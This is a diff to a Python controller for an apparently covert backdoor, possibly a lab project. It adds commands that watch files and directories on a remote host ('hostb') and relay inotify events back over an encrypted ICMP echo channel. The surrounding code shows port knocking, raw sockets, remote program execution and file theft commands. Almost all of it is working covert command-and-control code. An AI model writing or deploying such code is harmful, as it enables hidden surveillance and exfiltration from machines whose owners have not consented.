@@ -10,8 +10,10 @@ import os
 import socket
 import struct
 import sys
+import threading
 import time
 from dataclasses import dataclass
+from datetime import datetime
 
 
 KNOCK_PORTS = (7000, 8000, 9000)
@@ -29,10 +31,13 @@ CMD_TRANSFER_FILE = 2
 CMD_UNINSTALL = 3
 CMD_RUN_PROGRAM = 4
 CMD_REQUEST_FILE = 5
+CMD_WATCH_FILE = 6
+CMD_WATCH_DIR = 7
 ACK_READY = 0xFFFE
 ACK_META = 0xFFFD
 ACK_CHUNK = 0xFFFC
 ACK_END = 0xFFFB
+WATCH_STOP = 0xFFF7
 
 # Run-program limits.
 MAX_COMMAND_BYTES = 0xFFFFFFFF               # command bytes use 32-bit size header
@@ -907,6 +912,137 @@ def request_file(ctx: Context):
         send_socket.close()
 
 
+def watch_item(ctx: Context, cmd: int):
+    """Common handler for watch-file (CMD_WATCH_FILE) and watch-dir (CMD_WATCH_DIR).
+    Sends the path to hostb, then receives and prints inotify events live until
+    the user presses Enter or hostb signals done."""
+    if not ctx.connected:
+        print("Not connected. Use option 1 first.")
+        return
+
+    label = "file" if cmd == CMD_WATCH_FILE else "directory"
+    try:
+        watch_path = input(f"hostb {label} path> ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        return
+    if not watch_path:
+        print("Watch cancelled: no path given.")
+        return
+
+    path_bytes = watch_path.encode("utf-8")
+
+    try:
+        recv_socket = open_raw_icmp_recv_socket()
+        send_socket = open_raw_send_socket()
+    except PermissionError:
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+
+    try:
+        try:
+            send_icmp_identifier(
+                send_socket, ctx.source_ip, ctx.destination_ip,
+                encrypt_identifier(cmd, ctx.key), 1,
+            )
+        except OSError as exc:
+            ctx.error_message = f"failed to send watch request: {exc}"
+            ctx.error_code = 2
+            handle_error(ctx)
+
+        print(f"Sent watch request. Waiting for ready ack...")
+        if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
+                                  READY_TIMEOUT_SECONDS):
+            print("Watch failed: no ready ack from hostb.")
+            return
+        print("hostb is ready. Sending path...")
+
+        if not send_byte_stream_chunked(send_socket, recv_socket,
+                                        ctx.source_ip, ctx.destination_ip,
+                                        ctx.key, path_bytes):
+            print("Watch failed: path send aborted.")
+            return
+
+        print(f"\nWatching {label}: {watch_path}")
+        print("Press Enter to stop...\n")
+
+        # Background thread waits for user Enter to stop.
+        stop_event = threading.Event()
+
+        def _wait_for_enter():
+            try:
+                sys.stdin.readline()
+            except (EOFError, OSError):
+                pass
+            finally:
+                stop_event.set()
+
+        threading.Thread(target=_wait_for_enter, daemon=True).start()
+
+        event_lines = []
+        session_start = datetime.now()
+        expected_len: int | None = None
+        accumulated: dict[int, int] = {}
+
+        try:
+            while not stop_event.is_set():
+                result = _read_icmp_echo(recv_socket, ctx.destination_ip, 0.5)
+                if result is None or result == ():
+                    continue
+                sequence, identifier = result
+                value = decrypt_identifier(identifier, ctx.key)
+
+                if sequence == END_SEQ:
+                    print("\nhostb closed the watch session.")
+                    break
+
+                if sequence == 0:
+                    expected_len = value
+                    accumulated = {}
+                elif expected_len is not None and sequence >= 1:
+                    accumulated[sequence] = value
+                    num_packets = (expected_len + 1) // 2
+                    if len(accumulated) >= num_packets:
+                        out = bytearray()
+                        for i in range(1, num_packets + 1):
+                            v = accumulated.get(i, 0)
+                            out.append((v >> 8) & 0xFF)
+                            out.append(v & 0xFF)
+                        line = bytes(out[:expected_len]).decode("utf-8", errors="replace")
+                        print(line)
+                        event_lines.append(line)
+                        expected_len = None
+                        accumulated = {}
+        except KeyboardInterrupt:
+            stop_event.set()
+        finally:
+            try:
+                send_icmp_identifier(
+                    send_socket, ctx.source_ip, ctx.destination_ip,
+                    encrypt_identifier(WATCH_STOP, ctx.key), 1,
+                )
+            except OSError:
+                pass
+
+        count = len(event_lines)
+        print(f"\nWatch stopped. {count} event(s) captured.")
+
+        if event_lines:
+            log_name = f"watch_{session_start.strftime('%Y%m%d_%H%M%S')}.log"
+            try:
+                with open(log_name, "w") as f:
+                    f.write(f"Path:    {watch_path}\n")
+                    f.write(f"Started: {session_start.isoformat()}\n")
+                    f.write(f"Events:  {count}\n\n")
+                    f.write("\n".join(event_lines) + "\n")
+                print(f"Log saved: {log_name}")
+            except OSError as exc:
+                print(f"Warning: could not save log: {exc}")
+    finally:
+        recv_socket.close()
+        send_socket.close()
+
+
 def run_program(ctx: Context):
     if not ctx.connected:
         print("Not connected. Use option 1 first.")
@@ -1013,10 +1149,14 @@ if __name__ == "__main__":
         elif choice == "5":
             print("\nRequesting file from hostb...")
             request_file(ctx)
+        elif choice == "6":
+            print("\nWatching file on hostb...")
+            watch_item(ctx, CMD_WATCH_FILE)
+        elif choice == "7":
+            print("\nWatching directory on hostb...")
+            watch_item(ctx, CMD_WATCH_DIR)
         elif choice == "8":
             print("\nRunning program on hostb...")
             run_program(ctx)
-        elif choice in {"6", "7"}:
-            print("Not implemented yet.")
         else:
             print("Invalid choice.")
